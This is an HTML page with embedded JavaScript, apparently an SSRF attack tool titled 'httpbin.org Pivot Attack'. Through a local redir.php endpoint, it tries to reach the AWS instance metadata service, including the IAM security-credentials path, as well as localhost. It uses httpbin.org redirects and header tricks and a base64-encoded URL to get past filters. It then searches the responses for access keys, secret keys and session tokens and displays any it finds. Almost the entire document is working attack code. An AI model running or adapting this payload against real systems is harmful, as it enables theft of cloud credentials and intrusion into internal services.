<!DOCTYPE html>
<html>
<head>
    <title>httpbin.org Pivot Attack</title>
</head>
<body>
    <h1>üéØ Using httpbin.org as Attack Pivot</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Use httpbin.org's redirect functionality to access internal services
        var pivotAttempts = [
            // Try httpbin.org redirect to AWS metadata
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/',
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/',
            'http://httpbin.org/redirect-to?url=http://localhost/',
            
            // Try POST requests to different endpoints
            'http://httpbin.org/post',
            'http://httpbin.org/put', 
            'http://httpbin.org/patch',
            'http://httpbin.org/delete',
            
            // Try to use httpbin.org to make requests with custom headers
            'http://httpbin.org/response-headers?X-Custom-Header=test',
            'http://httpbin.org/response-headers?Location=http://169.254.169.254/latest/meta-data/',
            
            // Test different httpbin.org features that might help
            'http://httpbin.org/cookies/set/test/value',
            'http://httpbin.org/basic-auth/user/pass',
            'http://httpbin.org/bearer',
            
            // Try httpbin.org endpoints that might reveal server info
            'http://httpbin.org/user-agent',
            'http://httpbin.org/headers',
            'http://httpbin.org/ip',
            
            // Test if we can use httpbin.org to proxy requests
            'http://httpbin.org/anything/proxy-test',
            
            // Try subdomain variations that might be allowed
            'http://eu.httpbin.org/get',
            'http://na.httpbin.org/get', 
            'http://httpbingo.org/get',
            'http://postman-echo.com/get',
            'http://httpbin.org/base64/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw%3D%3D', // base64 encoded metadata URL
        ];
        
        for(var i = 0; i < pivotAttempts.length; i++) {
            try {
                results += "<h3>üîç " + (i+1) + ": " + pivotAttempts[i] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(pivotAttempts[i]), false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.length > 10) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>‚úÖ SUCCESS: " + xhr.responseText.length + " bytes</div>";
                    
                    // Look for AWS metadata or internal service responses
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('ami-') || text.includes('instance-') || text.includes('iam') || text.includes('security-credentials')) {
                        results += "<div style='background:#ff6b6b;color:white;padding:8px;border:2px solid red;'>üö® AWS METADATA DETECTED! üö®</div>";
                    }
                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
                        results += "<div style='background:#ffa500;color:white;padding:8px;border:2px solid orange;'>üîë AWS CREDENTIALS FOUND! üîë</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:8px;max-height:150px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 800) + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå No response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
